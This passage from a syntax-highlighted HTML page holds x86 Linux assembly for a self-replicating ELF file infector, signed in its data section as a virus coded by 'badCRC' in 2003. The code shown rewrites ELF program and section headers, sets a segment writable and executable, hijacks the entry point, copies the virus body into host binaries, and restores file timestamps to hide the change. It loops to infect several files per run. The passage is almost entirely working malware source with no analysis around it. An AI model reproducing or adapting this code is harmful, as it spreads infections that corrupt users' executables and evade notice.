      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">; stack new file size</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; p_filesz</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; p_filesz + p_vaddr</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; e_entry</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; put new entry point</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old_entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; save old</span><span class="sc0">

      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; p_filesz</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; p_filesz + p_offset</span><span class="sc0">
      </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; e_phnum</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; new p_filesz</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; new p_memsz</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">07h</span><span class="sc0">            </span><span class="sc1">; PF_R + PF_W + PF_X</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">                       </span><span class="sc1">; EDX = PHT offset + 4</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">

</span><span class="sc5">fix_PHT</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">next_entry_PHT</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">; fix this entry!</span><span class="sc0">

</span><span class="sc5">next_entry_PHT</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                       </span><span class="sc1">; next entry in the PHT + 4</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fix_PHT</span><span class="sc0">


      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; e_shoff</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; fix e_shoff</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; e_shnum</span><span class="sc0">

</span><span class="sc5">fix_SHT</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">next_entry_SHT</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; fix this entry!</span><span class="sc0">

</span><span class="sc5">next_entry_SHT</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                       </span><span class="sc1">; next entry in the SHT</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fix_SHT</span><span class="sc0">


      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; amount of bytes we are going</span><span class="sc0">
                                            </span><span class="sc1">;to move</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">xadd</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc6">std</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
      </span><span class="sc6">cld</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">virus_len</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">_start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">                         </span><span class="sc1">; copy the virus!</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5bh</span><span class="sc0">                        </span><span class="sc1">; sys_munmap</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numinfect</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">restore_date</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                        </span><span class="sc1">; sys_utime</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">258h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                        </span><span class="sc1">; sys_close</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">popad</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numinfect</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nos_vamos</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">leer_entrada</span><span class="sc0">

</span><span class="sc5">nos_vamos</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                        </span><span class="sc1">; sys_close</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">salir</span><span class="sc0">


</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">

</span><span class="sc5">dot</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">old_entry</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">final</span><span class="sc0">
</span><span class="sc5">numinfect</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mensaje</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[4096] virus coded by badCRC in 2003'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

</span><span class="sc5">len</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">mensaje</span><span class="sc0">


</span><span class="sc1">; This is only for the first generation</span><span class="sc0">

</span><span class="sc5">final</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                       </span><span class="sc1">; sys_exit</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">


</span><span class="sc5">virus_len</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">final</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
</span></div></body>
</html>
